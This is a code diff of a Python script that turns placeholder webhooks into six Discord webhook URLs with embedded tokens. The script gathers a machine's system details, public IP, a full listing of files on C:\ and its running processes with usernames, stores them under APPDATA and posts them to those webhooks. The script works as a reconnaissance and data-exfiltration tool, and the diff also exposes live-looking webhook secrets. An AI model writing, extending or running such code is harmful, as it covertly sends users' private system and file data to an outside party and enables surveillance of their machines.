@@ -1,109 +1,101 @@
+import os
 import sys
 import requests
-import json
 import platform
-import getpass
 import psutil
-from datetime import datetime
+import socket
+import datetime
+from pathlib import Path
 
-# Webhook URLs
-WEBHOOK_URLS = {
-    'system_info': 'https://your-webhook-url-for-system-info',
-    'database_cache': 'https://your-webhook-url-for-database-cache',
-    'active_processes': 'https://your-webhook-url-for-active-processes',
-    'recent_activities': 'https://your-webhook-url-for-recent-activities'
+# Webhooks
+WEBHOOKS = {
+    'system_processes': 'https://canary.discord.com/api/webhooks/1279137428371931248/eYRZf4HRZ5GmYXgLI_iRA5WiOhqVSFBDGn_ztg-oRrNrSWmdKq69WC0MX9P9nQuutQac',
+    'process_traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
+    'error': 'https://canary.discord.com/api/webhooks/1279188293438799902/S3ejH4YpQBv-7Yp4TfW8LCezK-UpzVxolIwdcX66uN-DQZ2DiXt-X2QdeL2mM9ky5Siz',
+    'database': 'https://canary.discord.com/api/webhooks/1279407337618145310/A7fONuJnsWJLLCwkB2XlNKga0XeQwO6yq3HjWzhHt6hqzafunlxxeIO_dpebSN_DcunP',
+    'recent_activity': 'https://canary.discord.com/api/webhooks/1279411390314057820/85pPrwRUCeX3EoLCexlHK0LOyAf9m9pRmRO3GIgZZMhMdm_gxAbMLWSE_0T6MXNhiWgK',
+    'system_info': 'https://canary.discord.com/api/webhooks/1279407392379109497/15w0yvCeqmb64b7NqPgtFL8ZRwmqjMb3G1H0Mu0NX4nBXnwqoWTLGogQOSBVS6_2CoC_'
 }
 
-def send_to_webhook(title, description, url):
-    """Send data to a webhook with an embedded format."""
-    embed = {
-        "embeds": [
-            {
-                "title": title,
-                "description": description,
-                "color": 0x00FF00  # Green color
-            }
-        ]
-    }
+def send_webhook(webhook_url, content):
     try:
-        response = requests.post(url, json=embed)
+        response = requests.post(webhook_url, json={'content': content})
         response.raise_for_status()
-        print(f"Embed sent to webhook: {title}")
-    except requests.RequestException as e:
-        print(f"Failed to send embed to webhook: {e}")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send webhook: {e}")
 
-def system_info():
-    uname = platform.uname()
-    boot_time = datetime.fromtimestamp(psutil.boot_time())
-    current_time = datetime.now()
-    info = {
-        'System': uname.system,
-        'Node Name': uname.node,
-        'Release': uname.release,
-        'Version': uname.version,
-        'Machine': uname.machine,
-        'Processor': uname.processor,
-        'Boot Time': boot_time.strftime('%Y-%m-%d %H:%M:%S'),
-        'Current Time': current_time.strftime('%Y-%m-%d %H:%M:%S'),
-        'User': getpass.getuser(),
-        'CPU Usage': f"{psutil.cpu_percent()}%",
-        'Memory Info': f"Total: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB, Available: {psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
-        'Disk Usage': f"Total: {psutil.disk_usage('/').total / (1024 ** 3):.2f} GB, Used: {psutil.disk_usage('/').used / (1024 ** 3):.2f} GB"
+def scan_directory(directory):
+    results = []
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            # Add your scanning logic here
+            # For example purposes, just print the file path
+            results.append(f"Found file: {file_path}")
+    return results
+
+def get_system_info():
+    system_info = {
+        "System": platform.system(),
+        "Node Name": platform.node(),
+        "Release": platform.release(),
+        "Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "Public IP": requests.get('https://api.ipify.org').text,
+        "HWID": platform.node(),
+        "Start Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S'),
     }
-    return info
+    return system_info
+
+def write_to_file(path, content):
+    with open(path, 'w') as f:
+        f.write(content)
 
 def main():
     if len(sys.argv) < 2:
-        print("Usage: script.py [options]")
-        sys.exit(1)
+        print("No option provided.")
+        return
 
     option = sys.argv[1]
+    output_folder = os.path.join(os.getenv('APPDATA'), 'MyPythonScript')
+    Path(output_folder).mkdir(parents=True, exist_ok=True)
+    error_log_path = os.path.join(output_folder, 'error_log.txt')
+    results_log_path = os.path.join(output_folder, 'results.txt')
 
-    if option == '--scan':
-        # Implement PC Deep Scan logic here
-        print("Performing PC Deep Scan...")
-        # Example: results = perform_deep_scan()
-        results = "Deep scan results here"
-        send_to_webhook("PC Deep Scan Results", results, WEBHOOK_URLS['system_info'])
-    elif option == '--system-info':
-        info = system_info()
-        info_str = json.dumps(info, indent=2)
-        send_to_webhook("System Information", info_str, WEBHOOK_URLS['system_info'])
-    elif option == '--database-cache':
-        # Implement Database Cache logic here
-        print("Retrieving Database Cache...")
-        # Example: cache_info = get_database_cache()
-        cache_info = "Database cache results here"
-        send_to_webhook("Database Cache Results", cache_info, WEBHOOK_URLS['database_cache'])
-    elif option == '--active-processes':
-        # Implement Active Processes logic here
-        print("Retrieving Active Processes...")
-        # Example: processes_info = get_active_processes()
-        processes_info = "Active processes results here"
-        send_to_webhook("Active Processes Results", processes_info, WEBHOOK_URLS['active_processes'])
-    elif option == '--recent-activities':
-        activity_type = sys.argv[2] if len(sys.argv) > 2 else ''
-        if activity_type == 'deleted':
-            print("Finding deleted files...")
-            # Example: deleted_files = find_recently_deleted_files()
-            deleted_files = "Deleted files results here"
-            send_to_webhook("Deleted Files", deleted_files, WEBHOOK_URLS['recent_activities'])
-        elif activity_type == 'renamed':
-            print("Finding renamed files...")
-            # Example: renamed_files = find_renamed_files()
-            renamed_files = "Renamed files results here"
-            send_to_webhook("Renamed Files", renamed_files, WEBHOOK_URLS['recent_activities'])
-        elif activity_type == 'closed':
-            print("Finding closed/opened files...")
-            # Example: closed_files = find_closed_files()
-            closed_files = "Closed/opened files results here"
-            send_to_webhook("Closed/Open Files", closed_files, WEBHOOK_URLS['recent_activities'])
+    try:
+        if option == '--scan-directory':
+            results = scan_directory("C:\\")  # Adjust the path as needed
+            write_to_file(results_log_path, "\n".join(results))
+            send_webhook(WEBHOOKS['process_traces'], "\n".join(results))
+
+        elif option == '--system-info':
+            system_info = get_system_info()
+            info_str = "\n".join([f"{k}: {v}" for k, v in system_info.items()])
+            write_to_file(results_log_path, info_str)
+            send_webhook(WEBHOOKS['system_info'], info_str)
+
+        elif option == '--database-cache':
+            # Placeholder for database cache logic
+            write_to_file(results_log_path, "Database cache retrieval is not implemented.")
+
+        elif option == '--active-processes':
+            processes = [proc.info for proc in psutil.process_iter(attrs=['pid', 'name', 'username', 'status'])]
+            processes_str = "\n".join([f"PID: {p['pid']}, Name: {p['name']}, User: {p['username']}, Status: {p['status']}" for p in processes])
+            write_to_file(results_log_path, processes_str)
+            send_webhook(WEBHOOKS['system_processes'], processes_str)
+
+        elif option == '--recent-activities':
+            # Placeholder for recent activities logic
+            write_to_file(results_log_path, "Recent activities retrieval is not implemented.")
+
         else:
-            print("Invalid activity type.")
-            sys.exit(1)
-    else:
-        print("Invalid option")
-        sys.exit(1)
+            print("Invalid option provided.")
+    
+    except Exception as e:
+        with open(error_log_path, 'a') as f:
+            f.write(f"Error: {e}\n")
+        print(f"Script execution completed. Check the error log for details.")
 
 if __name__ == "__main__":
     main()
